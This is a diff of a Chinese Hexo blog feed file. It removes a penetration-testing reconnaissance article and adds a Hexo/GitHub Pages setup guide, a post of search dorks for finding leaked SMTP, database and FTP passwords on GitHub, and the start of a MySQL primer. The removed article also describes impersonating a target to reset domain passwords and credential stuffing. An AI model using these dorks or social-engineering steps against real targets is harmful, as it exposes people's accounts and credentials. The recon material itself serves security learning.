-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。最简单的比如说目标站点的IP、中间件、脚本语言、端口、邮箱等等。我觉得信息收集在渗透测试的过程当中，是最重要的一环，这一环节没做好，没收集到足够多的可利用的信息，很难进行下一步的操作。</p>
-<h2 id="信息收集的方法"><a href="#信息收集的方法" class="headerlink" title="信息收集的方法"></a>信息收集的方法</h2><h3 id="1-查企业信息"><a href="#1-查企业信息" class="headerlink" title="1. 查企业信息"></a>1. 查企业信息</h3><p>使用爱企查，天眼查，企查查，领英对域名所有者（一般是公司）进行查询<br>可以收集到：</p>
-<ol>
-<li>法人</li>
-<li>公司电话信息</li>
-<li>邮箱信息</li>
-<li>地址</li>
-<li>股东信息等等</li>
+
+<h2 id="准备前提"><a href="#准备前提" class="headerlink" title="准备前提"></a>准备前提</h2><ol>
+<li>提前安装好<a href="https://nodejs.org/en">node.js</a>左边的那个</li>
+<li>提前安装好<a href="https://git-scm.com/downloads">GIt</a></li>
+<li>提前注册好一个<a href="https://github.com/">github</a>账号（ps:挂代理）</li>
+<li>如果文章图片没有显示，请自行挂代理</li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729094747957.png" alt="image-20230729094747957"></p>
-<h3 id="2-whois信息"><a href="#2-whois信息" class="headerlink" title="2. whois信息"></a>2. whois信息</h3><p>如果要查询域名的IP、所有者等信息的传输协议，就可以用whois</p>
-<p><strong>whois信息可以获取关键注册人的信息，其中包括：</strong></p>
+<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol>
+<li>在本地找个目录放博客源文件，路径不要有中文(例：D:\hexo\blog)</li>
+<li>在选定的目录中，右键Git Bash Here</li>
+<li>使用npm命令安装Hexo，输入：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli #该命令执行不成功可以查看一下博客目录是不是只读，或者重新创建文件夹。</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">hexo g </span><br></pre></td></tr></table></figure>
+
+<p>构建好的效果:</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727130841778.png" alt="image-20230727130841778"></p>
+<ol start="4">
+<li>cd进入这个目录<br>检测网站雏形，分别按顺序输入以下三条命令：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new test_my_site</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">之后就可以访问127.0.0.1:4000访问blog了或者http://localhost:4000/ </span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>配置ssh</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh    //检查本机已存在的ssh密钥，如果是重新创建请删除用户目录下的.ssh文件夹</span><br><span class="line">//如果提示：No such file or directory 说明你是第一次使用git。</span><br><span class="line">ssh-keygen -t rsa -C “xxxxxxx@qq.com”  //或者其他邮箱</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</li>
+<li>key填写C:\Users\Administrator.ssh\id_rsa.pub中的内容（C盘用户目录下的管理员用户下的.shh目录下的id_rsa.pub中的内容用记事本打开复制里面的内容）</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727131643490.png" alt="image-20230727131643490"></p>
+<ul>
+<li>尝试ssh连接,测试是否成功</li>
+</ul>
 <blockquote>
-<p>所有者<br>联系电话<br>所有者联系邮箱<br>注册商<br>域名注册时间<br>域名状态<br>域名到期时间<br>DNS服务器等。</p>
+<p>ssh -T <a href="mailto:&#103;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a>   #注意邮箱地址不用改</p>
 </blockquote>
-<p><strong>可以对其进行</strong></p>
+<ul>
+<li>提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：</li>
+</ul>
 <blockquote>
-<p>爆破邮箱<br>邮箱反查域名<br>域名劫持<br>社工<br>寻找旁站等</p>
+<p>Hi （你的用户名）! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
 </blockquote>
-<p><strong>常用的工具有：</strong><br><a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a><br><a href="https://whois.cloud.tencent.com/domain">域名信息查询 - 腾讯云</a><br><a href="https://whois.aliyun.com/">阿里云域名信息查询</a><br><a href="https://www.whois.com/whois/">域名信息查询</a></p>
-<h3 id="3-子域名"><a href="#3-子域名" class="headerlink" title="3. 子域名"></a>3. 子域名</h3><ul>
-<li><p>子域名是指二级域名，是一级域名（顶级域名）的下一级，收集的子域名越多，我们测试的目标就越多，渗透的成功率也越大。往往在主站找不到突破口的时候，我们从子域名入手。</p>
-</li>
-<li><p>有许多第三方服务聚合了大量的DNS数据集，可以通过它们来检索给定域名的子域名</p>
-</li>
-</ul>
-<p>（1）VirusTotal：<a href="https://www.virustotal.com/#/home/search">https://www.virustotal.com/#/home/search</a><br>（2）DNSdumpster：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p>
 <ul>
-<li>爆破枚举工具</li>
+<li>在<strong>blog</strong>目录下打开以<strong>管理员身份cmd</strong></li>
 </ul>
-<p>（1）layer子域名挖掘机<br>（2）subDomainsBrute</p>
-<ul>
-<li>IP段的收集<br>一般IP的话，我们在收集子域名的时候，就大概知道目标网站的IP段了。<br>也可以通过whois命令获取。即通过中国互联网信息中心<a href="https://ipwhois.cnnic.cn/index.jsp">https://ipwhois.cnnic.cn/index.jsp</a> 进行查询：</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729151754688.png" alt="image-20230729151754688"></p>
-<ul>
-<li>Google语法</li>
-</ul>
-<p>可以利用Google和Bing这样的搜索引擎进行搜索查询（site:<a href="http://www.xxx.com)/">www.xxx.com）</a></p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729151956889.png" alt="image-20230729151956889"></p>
-<h3 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4. DNS"></a>4. DNS</h3><p>通过DNS解析找到IP地址,主要有以下几种方法:<br><strong>（1）ping</strong></p>
-<p><strong>（2）nslookup</strong></p>
-<p>NSLOOKUP是NT、2000中连接DNS服务器，查询域名信息的一个非常有用的命令，可以指定查询的类型，可以查到DNS记录的生存时间还可以指定使用哪个DNS服务器进行解析。在已安装TCP&#x2F;IP协议的电脑上面均可以使用这个命令。主要用来诊断域名系统 (DNS) 基础结构的信息。</p>
-<p>直接查询：<code>nslookup 域名</code></p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230731150528539.png" alt="image-20230731150528539"></p>
-<p>查询更具体的信息：<code>slookup -d 域名</code></p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230731151325344.png" alt="image-20230731151325344"></p>
-<p><strong>（3）dig工具</strong></p>
-<p><code>dig</code> 和 <code>nslookup</code> 之间差异不大，但 <code>dig</code> 更像一个加强版的 <code>nslookup</code>，可以查询到一些由域名服务器管理的信息，这在排查某些问题的时候非常有用。</p>
-<p><strong>（4）dnsenum工具</strong></p>
-<p>dnsenum会自动检测域传送漏洞<br>使用<code>dnsenum -h</code>来查询全部命令</p>
-<p><strong>（5）站长之家</strong></p>
-<p>站长之家官网首页(<a href="http://tool.chinaz.com/">http://tool.chinaz.com</a>)<br> 站长之家DNS查询(<a href="https://tool.chinaz.com/dns/">https://tool.chinaz.com/dns/</a>)</p>
-<p><strong>（6）CDN技术</strong></p>
-<p>很多时候，网站都会开启CDN加速，导致我们查询到的IP不是真实的IP，所以得先查询到真实的IP地址。</p>
-<ul>
-<li><p>可以全网爆破查询真实ip,返回结果有多个，说明启用了CND技术。</p>
-</li>
-<li><p>或者DNS的查询（<a href="https://www.dnsdb.io/zh-cn/search?q=www.aliyun.com%20type:MX">https://www.dnsdb.io/zh-cn/search?q=www.aliyun.com%20type:MX</a> ）</p>
-</li>
-<li><p>绕过CDN寻找真实IP的方法<br>（1）<strong>内部邮箱源：</strong>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping 这个邮件服务器的域名， 就可以获得目标的真实IP （注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的）。</p>
-<p>（2）<strong>扫描网站测试文件</strong>，如phpinfo 、test 等，从而找到目标的真实IP 。</p>
-<p>（3）<strong>分站域名：</strong>很多网站主站的访问量会比较大，所以主站都是挂CDN 的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。</p>
-<p>（4）<strong>国外访问：</strong>国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站访问，可能会得到真实的IP。</p>
-<p>（5）<strong>查询历史域名的解析记录：</strong>也许目标很久以前并没有用过CDN，所以可以通过网站<a href="https://www.netcraft.com/">NETC RAFT</a>来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</p>
-<p>（6）<strong>如果目标网站有自己的App</strong>，可以尝试利用Fiddler或BurpSuite截取App的请求，从里面找到目标的真实IP。</p>
-</li>
-</ul>
-<h3 id="5-网络空间搜索引擎收集敏感信息"><a href="#5-网络空间搜索引擎收集敏感信息" class="headerlink" title="5. 网络空间搜索引擎收集敏感信息"></a>5. 网络空间搜索引擎收集敏感信息</h3><p>网络空间搜索引擎通过全网扫描的方式，将基础数据进行格式化存储，供安全人员按需搜索使用，提升了安全人员的工作效率。</p>
-<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、fofa</p>
-<h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><p><a href="https://www.shodan.io/">Shodan</a> 是目前最为知名的黑客搜索引擎。</p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729153346539.png" alt="image-20230729153346539"></p>
-<p>简单语法：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hostname：      # 搜索指定的主机或域名,例如 hostname:&quot;google&quot;</span><br><span class="line">port：          # 搜索指定的端口或服务,例如 port:&quot;21&quot;</span><br><span class="line">country：       # 搜索指定的国家,例如 country:&quot;CN&quot;</span><br><span class="line">city：          # 搜索指定的城市,例如 city:&quot;hunan&quot;</span><br><span class="line">org：           # 搜索指定的组织或公司,例如 org:&quot;google&quot;</span><br><span class="line">isp：           # 搜索指定的ISP供应商,例如 isp:&quot;China Telecom&quot;</span><br><span class="line">product：       # 搜索指定的操作系统/软件/平台,例如 product:&quot;Apache httpd&quot;</span><br><span class="line">version：       # 搜索指定的软件版本,例如 version:&quot;1.6.2&quot;</span><br><span class="line">geo：           # 搜索指定的地理位置,参数为经纬度,例如 geo:&quot;31.8639, 117.2808&quot;</span><br><span class="line">before/after：  # 搜索指定收录时间前后的数据,格式为dd-mm-yy,例如 before:&quot;11-11-15&quot;</span><br><span class="line">net：           # 搜索指定的IP地址或子网,例如 net:&quot;210.45.240.0/24&quot;a</span><br></pre></td></tr></table></figure>
-
-<h4 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h4><p><a href="https://www.zoomeye.org/">ZoomEye</a> 是北京知道创宇公司发布的网络空间侦测引擎</p>
-<p>&#x27A4;ZoomEye 支持公网设备指纹检索和 Web 指纹检索。网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等。</p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230729154002739.png" alt="image-20230729154002739"></p>
-<p>简单语法：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">app:nginx           # 组件名</span><br><span class="line">ver:1.0             # 版本</span><br><span class="line">os:windows          # 操作系统</span><br><span class="line">country:&quot;China&quot;     # 国家</span><br><span class="line">city:&quot;hunan&quot;        # 城市</span><br><span class="line">port:80             # 端口</span><br><span class="line">hostname:google     # 主机名</span><br><span class="line">site:google.com     # 网站域名</span><br><span class="line">desc:nmask          # 描述</span><br><span class="line">keywords:passwd     # 关键词</span><br><span class="line">service:ftp         # 服务类型</span><br><span class="line">ip:8.8.8.8          # ip地址</span><br><span class="line">cidr:8.8.8.8/24     # ip地址段</span><br></pre></td></tr></table></figure>
-
-<h4 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h4><p><a href="https://fofa.info/">FOFA</a> 是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
-<p>简单语法：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">title=&quot;abc&quot;        # 从标题中搜索abc。例：标题中有北京的网站。</span><br><span class="line">header=&quot;abc&quot;       # 从http头中搜索abc。例：jboss服务器。</span><br><span class="line">body=&quot;abc&quot;         # 从html正文中搜索abc。例：正文包含Hacked by。</span><br><span class="line">domain=&quot;qq.com&quot;    # 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</span><br><span class="line">host=&quot;.gov.cn&quot;     # 从url中搜索.gov.cn,注意搜索要用host作为名称。</span><br><span class="line">port=&quot;443&quot;         # 查找对应443端口的资产。例： 查找对应443端口的资产。</span><br><span class="line">ip=&quot;1.1.1.1&quot;       # 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</span><br><span class="line">protocol=&quot;https&quot;   # 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</span><br><span class="line">city=&quot;Beijing&quot;     # 搜索指定城市的资产。例： 搜索指定城市的资产。</span><br><span class="line">region=&quot;Zhejiang&quot;  # 搜索指定行政区的资产。例： 搜索指定行政区的资产。</span><br><span class="line">country=&quot;CN&quot;       # 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</span><br><span class="line">cert=&quot;google.com&quot;  # 搜索证书(https或者imaps等)中带有google.com的资产。</span><br></pre></td></tr></table></figure>
-
-<p>每个平台都有自己的特点和优势，我们可以使用多个平台来补充自己的结果，让搜索的信息更全。</p>
-<h3 id="6-网站信息收集—指纹信息"><a href="#6-网站信息收集—指纹信息" class="headerlink" title="6. 网站信息收集—指纹信息"></a>6. 网站信息收集—指纹信息</h3><p><strong>CMS及Web指纹识别的必要性</strong></p>
-<p><strong>必要性</strong>：在渗透测试中，只有识别出相应的Web容器或者CMS ，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
-<p><strong>CMS：</strong>内容管理系统是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。</p>
-<ul>
-<li><strong>云悉指纹：</strong><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></li>
-<li><strong>36OFinger-P：</strong><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></li>
-<li><strong>潮汐指纹：</strong><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></li>
-</ul>
-<h3 id="7-社会工程学"><a href="#7-社会工程学" class="headerlink" title="7. 社会工程学"></a>7. 社会工程学</h3><p>（1）社会工程学在渗透测试中起着不小的作用，利用社会工程学，攻击者可以从一名员工的口中挖掘出本应该是秘密的信息。</p>
-<p>（2）假设攻击者对一家公司进行渗透测试，正在收集目标的真实IP阶段，此时就可以利用收集到的这家公司的某位销售人员的电子邮箱。首先，给这位销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。</p>
-<p>（3）通过进一步地应用社会工程学，假设现在己经收集了目标人物的邮箱、QQ 、电话号码、姓名，以及域名服务商， 也通过爆破或者撞库的方法获取邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持。</p>
-<p>（4）除此以外，还可以利用“社工库”查询想要得到的信息，社工库是用社会工程学进行攻击时积累的各方数据的结构化数据库。这个数据库里有大量信息，甚至可以找到每个人的各种行为记录。利用收集到的邮箱，可以在社工库中找到己经泄露的密码，其实还可以通过搜索引擎搜索到社交账号等信息，然后通过利用社交和社会工程学得到的信息构造密码字典，对目标用户的邮箱和OA账号进行爆破或者撞库。</p>
-<h3 id="8-敏感目录"><a href="#8-敏感目录" class="headerlink" title="8. 敏感目录"></a>8. 敏感目录</h3><p>敏感目录扫描能够得到其他网页的很多信息，找到后台管理页面，尝试进入后台，然后提升权限等<br>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄露<br>工具</p>
 <blockquote>
-<p>常用工具：御剑，小米范WEB目录扫描器，dirb，dirsearch</p>
+<p>npm install hexo-deployer-git –save</p>
 </blockquote>
-<h4 id="小米范WEB目录扫描器"><a href="#小米范WEB目录扫描器" class="headerlink" title="小米范WEB目录扫描器"></a>小米范WEB目录扫描器</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230804102827534.png" alt="image-20230804102827534"></p>
-<h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><p>御剑后台扫描工具</p>
-<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230804102613159.png" alt="image-20230804102613159"></p>
-<h4 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h4><p>Kali Linux内置工具<br>dirb是一个基于字典的web目录扫描工具,会用递归的方式来获取更多的目录,它还支持代理和http认证限制访问的网站</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb https:www.baidu.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727132640132.png" alt="image-20230727132640132"></p>
+<ul>
+<li>返回Git Bash Here继续配置</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name “luozhixiaowo”  // 你的github用户名，非昵称</span><br><span class="line">git config --global user.email “xxx@qq.com“  // 填写你的github注册邮箱</span><br></pre></td></tr></table></figure>
 
-<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>dirsearch是一个python开发的目录扫描工具,目的是扫描网站的敏感文件和目录从而找到突破口。<br>项目地址：<a href="https://github.com/maurosoria/dirsearch/">https://github.com/maurosoria/dirsearch/</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://www.baidu.com</span><br></pre></td></tr></table></figure>]]></content>
+<ol start="6">
+<li>准备上传代码</li>
+</ol>
+<ul>
+<li><p>在github上新建一个存储库，命名为（github的用户名.github.io）</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727133023861.png" alt="image-20230727133023861"></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727133320089.png" alt="image-20230727133320089"></p>
+</li>
+<li><p>点击创建</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727133447955.png" alt="image-20230727133447955"></p>
+</li>
+<li><p>编辑_config.yml（站点配置文件）文件，在最后改成这样</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">	type: git</span><br><span class="line">	repository: git@github.com:你的GitHub用户名/你的GitHub用户名.github.io.git</span><br><span class="line">	branch: main</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>注意保持格式，缩进不对，会导致一会儿，上传不成功 PS:建议直接Tab</p>
+</li>
+<li><p>最后上传</p>
+</li>
+</ul>
+<blockquote>
+<p>hexo d -g<br>每次上传成功之后，需要等待1-5分钟，用来刷新页面<br>PS:上传之前也可以hexo clean #清除缓存一下</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/202303271424650-1.png" alt="202303271424650-1"></p>
+<ul>
+<li>博客链接在创建的存储库的设置中-pages-如图设置</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230727134317395.png" alt="image-20230727134317395"></p>
+<ol start="7">
+<li>hexo命令介绍</li>
+</ol>
+<blockquote>
+<p>hexo n “我的博客” &#x3D;&#x3D; hexo new “我的博客” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo g &#x3D;&#x3D; hexo generate #生成<br>hexo s &#x3D;&#x3D; hexo server #启动服务预览<br>hexo d &#x3D;&#x3D; hexo deploy #部署</p>
+<p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP<br>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令<br>hexo version #查看Hexo的版本<br>hexo generate #生成静态页面至public目录</p>
+<p>hexo s -g #生成并本地预览<br>hexo d -g #生成并上传</p>
+</blockquote>
+<ol start="8">
+<li>hexo目录结构</li>
+</ol>
+<blockquote>
+<p>+– .deploy #hexo deploy生成的文件<br>+– node_modules #npm组件<br>+– public #生成的静态网页文件<br>+–scaffolds #模板<br>+– source #博客正文和其他源文件<br>| +– _posts #我们自己写的文章以md结尾<br>+– themes #主题<br>+– _config.yml #全局配置文件<br>– package.json #定义了hexo所需要的各种模块</p>
+</blockquote>
+<ol start="9">
+<li>选择一个自己喜欢的主题，不知道有什么好用的主题可以直接，B站搜HEXO主题</li>
+<li>这里我用的是Next主题<br>这里给几个主题配置教程可能有些老<br><a href="https://juejin.cn/post/7169115268944560135#heading-48">Hexo-Next主题搭建个人博客最新配置教程！</a><br><a href="https://juejin.cn/post/6844903696455696391?searchId=20230728110022C8105951329DA4924C3B">Hexo+NexT 打造一个炫酷博客</a><br><a href="https://www.bilibili.com/video/BV16W411t7mq/?p=14&spm_id_from=333.880.my_history.page.click">馨客栈分享</a></li>
+</ol>
+<hr>
+<p><em>转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 <a href="mailto:&#x31;&#57;&#x39;&#52;&#x36;&#x35;&#48;&#x30;&#56;&#54;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#x31;&#57;&#x39;&#52;&#x36;&#x35;&#48;&#x30;&#56;&#54;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a></em> </p>
+]]></content>
+      <categories>
+        <category>博客搭建</category>
+      </categories>
+      <tags>
+        <tag>HEXO</tag>
+        <tag>blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息收集之GitHub搜索语法</title>
+    <url>/2023/08/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BGitHub%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="信息收集之GitHub搜索语法"><a href="#信息收集之GitHub搜索语法" class="headerlink" title="信息收集之GitHub搜索语法"></a>信息收集之GitHub搜索语法</h2><span id="more"></span>
+
+<p>在渗透测试的信息收集阶段，可以去Github和码云上搜索与目标有关的信息，或者就有意想不到的收获。(有些开发人员将代码上传到代码库的时候，有可能连一些重要的配置信息也上传了)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in:name test               #仓库标题搜索含有关键字test</span><br><span class="line">in:descripton test         #仓库描述搜索含有关键字</span><br><span class="line">in:readme test             #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 test           #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 test           #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:test                  #用户名搜素</span><br><span class="line">license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java test         #在java语言的代码中搜索关键字</span><br><span class="line">user:test in:name test     #组合搜索,用户名test的标题含有test的</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-Github-进行邮件配置信息收集"><a href="#使用-Github-进行邮件配置信息收集" class="headerlink" title="使用 Github 进行邮件配置信息收集"></a>使用 Github 进行邮件配置信息收集</h3><p>很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com smtp</span><br><span class="line">site:Github.com smtp @qq.com</span><br><span class="line">site:Github.com smtp @126.com</span><br><span class="line">site:Github.com smtp @163.com</span><br><span class="line">site:Github.com smtp @sina.com.cn</span><br><span class="line">site:Github.com smtp password</span><br><span class="line">site:Github.com String password smtp</span><br><span class="line">……</span><br><span class="line">我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的</span><br><span class="line">site:Github.com smtp @baidu.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用Github进行数据库信息收集"><a href="#使用Github进行数据库信息收集" class="headerlink" title="使用Github进行数据库信息收集"></a>使用Github进行数据库信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com sa password</span><br><span class="line">site:Github.com root password</span><br><span class="line">site:Github.com User ID=’sa’;Password</span><br><span class="line">site:Github.com inurl:sql</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用Github进行-SVN-信息收集"><a href="#使用Github进行-SVN-信息收集" class="headerlink" title="使用Github进行 SVN 信息收集"></a>使用Github进行 SVN 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com svn</span><br><span class="line">site:Github.com svn username</span><br><span class="line">site:Github.com svn password</span><br><span class="line">site:Github.com svn username password </span><br></pre></td></tr></table></figure>
+
+<h3 id="使用Github进行综合信息收集"><a href="#使用Github进行综合信息收集" class="headerlink" title="使用Github进行综合信息收集"></a>使用Github进行综合信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com password</span><br><span class="line">site:Github.com ftp ftppassword</span><br><span class="line">site:Github.com 密码</span><br><span class="line">site:Github.com 内部</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>渗透</category>
       </categories>
       <tags>
         <tag>Wed安全</tag>
         <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL语法</title>
+    <url>/2023/08/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<h1 id="MySQL语法"><a href="#MySQL语法" class="headerlink" title="MySQL语法"></a>MySQL语法</h1><h2 id="1-数据库相关概念"><a href="#1-数据库相关概念" class="headerlink" title="1. 数据库相关概念"></a>1. 数据库相关概念</h2><p>数据库(database)就是存储数据的仓库，数据库是一个以某种有结构的有顺序存储的数据集合，理解数据库的一种最简单的办法是将其想象为一个文件柜。此文件柜是一个存放数据的物理位置，不管数据是什么以及如何组织的。</p>
+<span id="more"></span>
+
+<p>数据库管理系统主要分为以下两类:</p>
+<p><strong>1.关系数据库</strong><br>关系数据库是创建在关系模型基础上的数据库，“一对一、一对多、多对多”等关系模型。借助于集合代数等数学概念和方法来处理数据库中的数据。现实世界中的各种实体以及实体之间的各种联系均用关系模型来表示。<br>几乎所有的数据库管理系统都配备了一个开放式数据库连接 (ODBC) 驱动程序，令各个数据库之间得以互相集成。<br>安全系数高，容易理解，比较浪费磁盘空间。<br>典型代表有: MySQL、0racle、Microsoft SQL Server、Access及PostgreSQL等；<br><strong>2.非关系型数据库 NOSQL</strong><br>非关系型数据库是对不同于传统的关系数据库的数据库管理系统的统称。与关系数据库最大的不同点是不使用SQL作为查询语言。<br>安全系数低，效率高<br>典型代表有: BigTable (Google)、Cassandra、MongoDB、CouchDB;还包括键值数据库:Apache Cassandra (Facebook) 、LevelDB (Google)</p>
+<p><strong>区别</strong><br>关系型数据库:<br>实例-&gt;数据库 -&gt;表(table) - &gt;记录行(row)、数据字段(column)<br>非关系型数据库:<br>实例-&gt;数据库-&gt;集合(collection)-&gt;键值对(key-value)非关系型数据库不需要手动建数据库和集合 (表)。</p>
+<p><strong>常见数据库</strong></p>
+<p>一、关系型数据库</p>
+<ol>
+<li>MySq1数据库，默认端口是:3306:</li>
+<li>Oracle数据库，默认端口号为:1521;</li>
+<li>Sql Server数据库 ，默认端口号为:1433:</li>
+<li>DB2数据库，默认端口号为: 5000:</li>
+<li>PostgreSQL数据库，默认端口号为:5432:</li>
+<li>国产的DM达梦数据库，默认端口号为:5236。</li>
+</ol>
+<p>二、NoSq1数据库(非关系型数据库)</p>
+<ol>
+<li>Redis数据库，默认端口号: 6379;</li>
+<li>Memcached数据库，默认端口号:11211 ;</li>
